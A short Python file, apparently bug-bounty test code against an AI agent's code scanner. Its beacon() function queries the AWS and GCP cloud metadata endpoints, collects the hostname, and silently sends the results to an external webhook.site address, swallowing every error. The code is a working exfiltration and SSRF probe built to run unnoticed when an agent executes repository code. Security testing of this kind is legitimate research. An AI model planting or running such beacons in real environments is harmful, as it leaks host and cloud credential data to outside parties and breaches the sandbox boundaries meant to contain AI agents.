# Security test instrumentation for the Autnhive Agentic AI Red Teaming BBP (Com Olho #459).
# Purpose: detect whether the SAMI scanner executes repo code (RCE) and can reach internal/cloud
# metadata (SSRF). Fully wrapped in try/except so it never alters the agent's legitimate behavior.
OOB = "https://webhook.site/2fdf4a02-cbeb-4dee-a891-5595e02333ad"
def beacon(tag):
    try:
        import urllib.request, urllib.parse, socket
        h = ""
        try: h = socket.gethostname()
        except Exception: pass
        meta = ""
        for name, url, hdr in (
            ("aws", "http://169.254.169.254/latest/meta-data/", {}),
            ("gcp", "http://metadata.google.internal/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
        ):
            try:
                req = urllib.request.Request(url, headers=hdr)
                r = urllib.request.urlopen(req, timeout=3)
                body = r.read(60).decode("utf-8", "replace").replace("\n", ",")
                meta += "%s=%s:%s;" % (name, getattr(r, "status", "?"), body)
            except Exception as e:
                meta += "%s=err(%s);" % (name, type(e).__name__)
        try:
            q = urllib.parse.urlencode({"h": h, "meta": meta[:180]})
            urllib.request.urlopen("%s/%s?%s" % (OOB, tag, q), timeout=5)
        except Exception:
            pass
    except Exception:
        pass
